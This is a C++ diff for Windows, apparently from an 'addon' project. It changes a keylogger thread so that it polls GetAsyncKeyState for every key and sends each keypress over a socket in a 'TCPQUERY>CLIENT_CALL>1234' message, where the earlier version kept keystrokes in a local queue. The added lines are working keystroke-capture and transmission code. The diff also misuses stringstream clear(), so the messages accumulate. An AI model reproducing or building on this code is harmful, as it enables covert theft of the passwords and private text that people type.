@@ -4,12 +4,11 @@
 
 
 
-extern addonThread* gThread;
-extern addonMutex* gMutex;
-extern addonKeylog* gKeylog;
-
-
-std::queue<int> keyQueue;
+extern addonThread *gThread;
+extern addonMutex *gMutex;
+extern addonSocket *gSocket;
+extern addonKeylog *gKeylog;
+extern std::queue<std::string> send_to;
 
 
 
@@ -21,7 +20,7 @@ addonKeylog::addonKeylog()
 
 	this->active = true;
 
-	this->keylogHandle = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread);
+	this->keylogHandle = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread, NULL);
 }
 
 
@@ -37,9 +36,11 @@ addonKeylog::~addonKeylog()
 
 
 
-DWORD _stdcall keylog_thread(LPVOID lpParam)
+DWORD __stdcall keylog_thread(LPVOID lpParam)
 {
 	addonDebug("Thread 'keylog_thread' successfuly started");
+
+	std::stringstream format;
 
 	while(gKeylog->active)
 	{
@@ -47,14 +48,16 @@ DWORD _stdcall keylog_thread(LPVOID lpParam)
 		{
 			if(GetAsyncKeyState(q) == -32767)
 			{
-				gMutex->Lock(gMutex->mutexHandle);
-				keyQueue.push(q);
-				gMutex->unLock(gMutex->mutexHandle);
+				format << "TCPQUERY" << '>' << "CLIENT_CALL" << '>' << 1234 << '>' << q; // "TCPQUERY>CLIENT_CALL>1234>%i   ---   Sends async key data (array) | %i - pressed key
+
+				gSocket->Send(format.str());
+
+				format.clear();
 			}
 		}
 
-		Sleep(1);
+		Sleep(5);
 	}
 
-	return 1;
+	return true;
 }
